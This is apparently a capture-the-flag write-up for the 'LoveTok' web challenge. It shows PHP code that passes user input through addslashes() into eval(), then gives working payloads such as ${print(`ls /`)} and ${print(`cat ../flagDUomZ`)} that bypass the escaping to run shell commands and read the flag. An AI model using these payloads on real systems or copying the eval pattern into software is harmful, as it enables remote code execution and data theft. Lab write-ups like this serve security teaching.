# LoveTok
![Screenshot from 2021-08-15 15-10-24](https://user-images.githubusercontent.com/87865134/129471709-b0376ea8-bf4d-4379-a679-bac6403f1d85.png)

## - Download source code and analysis
- Use **MVC**
- Have:
  - Router:
  ```php
    $router = new Router();
    $router->new('GET', '/', 'TimeController@index');
  ```
  - Controller:
  ```php
    class TimeController
    {
        public function index($router)
        {
            $format = isset($_GET['format']) ? $_GET['format'] : 'r';
            $time = new TimeModel($format);
            return $router->view('index', ['time' => $time->getTime()]);
        }
    }
  ```
  - Model: 
  ```php
    class TimeModel
    {
        public function __construct($format)
        {
            $this->format = addslashes($format);
            echo($this->format . '\n');

            [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
            $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
        }

        public function getTime()
        {
            eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
            return isset($time) ? $time : 'Something went terribly wrong';
        }
    }
  ```
- `TimeModel` use `addslashes()` function to escape `$format` which is data of `$_GET('format')` and put it in `eval()` function => it it a vulnerability

## - Exploit: 
- `addslashes()` function don't escape characters: `$`, `{`, `}`, ``` ` ``` => can bypass use [Variable parsing](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple) and [Execution Operators](https://www.php.net/manual/en/language.operators.execution.php)

### 1. List files on directory
- payload:
```php
?format=${print(`ls /`)}
```
![Screenshot from 2021-08-15 15-25-48](https://user-images.githubusercontent.com/87865134/129472156-cf8f1bbe-3662-4176-a7b1-1a1eec7498a8.png)

>  found file `flagDUomZ` 

### 2. Read file to get flag
- payload:
```php
?format=${print(`cat ../flagDUomZ`)}
```
![Screenshot from 2021-08-15 15-27-59](https://user-images.githubusercontent.com/87865134/129472193-a031e325-7114-4647-880a-b117d6863769.png)

## - References:
- [Variable parsing](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple)
- [Execution Operators](https://www.php.net/manual/en/language.operators.execution.php)
